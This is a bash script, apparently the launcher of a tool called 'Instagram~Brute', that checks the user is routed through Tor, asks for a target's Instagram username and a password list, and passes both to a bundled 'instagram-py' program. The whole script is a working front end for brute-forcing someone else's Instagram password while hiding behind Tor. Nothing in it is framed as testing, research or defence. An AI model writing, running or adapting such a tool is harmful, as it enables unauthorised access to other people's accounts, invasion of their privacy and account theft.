#!/bin/bash
CWD=$(pwd)
#<<<----------colour substitution by variables---------->>>
B0="$(printf '\033[100m')" S0="$(printf '\033[30m')"
B1="$(printf '\033[91m')" S1="$(printf '\033[31m')"
B2="$(printf '\033[92m')" S2="$(printf '\033[32m')"
B3="$(printf '\033[93m')" S3="$(printf '\033[33m')"
B4="$(printf '\033[94m')" S4="$(printf '\033[34m')"
B5="$(printf '\033[95m')" S5="$(printf '\033[35m')"
B6="$(printf '\033[96m')" S6="$(printf '\033[36m')"
B7="$(printf '\033[97m')" S7="$(printf '\033[37m')"
R1="$(printf '\033[0;1m')" R0="$(printf '\033[00m')"
#<<<-----------special colours----------->>>
T="$(printf '\033[5;1;32m')"
#<<<-------Trap Force EXIT-------->>>
exit_on_signal_SIGINT () {
    echo "${S1} [✗] Received INTR call - Exiting...${R0}"
    exit 0
}
trap exit_on_signal_SIGINT SIGINT
if [[ -e "$CWD/config.sh" ]]; then
    bash $CWD/config.sh
    cd $CWD
fi
#<<<---------BANNER--------->>>
__banner__() {
echo -e "
${S6}▀█▀ ░█▀▀█ ── ░█▀▀█ ░█─░█ ░█─░█ ▀▀█▀▀ ░█─░█${R0}
${S3}░█─ ░█─▄▄ ▀▀ ░█▀▀▄ ░█▀▀█ ░█─░█ ─░█── ░█─░█${R0}
${S1}▄█▄ ░█▄▄█ ── ░█▄▄█ ░█─░█ ─▀▄▄▀ ─░█── ─▀▄▄▀${R0}
${B5}${S2}Authoured by: Suman kumar ~BHUTUU${R0}${R1}
${S2}<<<${S1}----------${3}Instagram~Brute${S1}----------${S2}>>>${R0}
"
}
#<<<----------Program----------->>>
printf "${S4}Please run 'tor' in another session${R0}\n"
printf "${S5}Run 'y' if you are connected to tor==> ${R0}"
read TORR
if [[ ${TORR} == 'Y' || ${TORR} == 'y' ]]; then
:
else
printf "${S2}[${S1}!${S2}]${S1}Since you don't have started the tor server, Exiting....${R0}\n"
exit 1
fi
__banner__
echo
printf "${S2}Enter the target's username==> ${S1}"
read USRNM
echo
printf "${S2}Enter your password list (path/name)==> ${S1}"
read PASW
cd ${CWD}/assets
./instagram-py -u ${USRNM} -pl ${PASW}
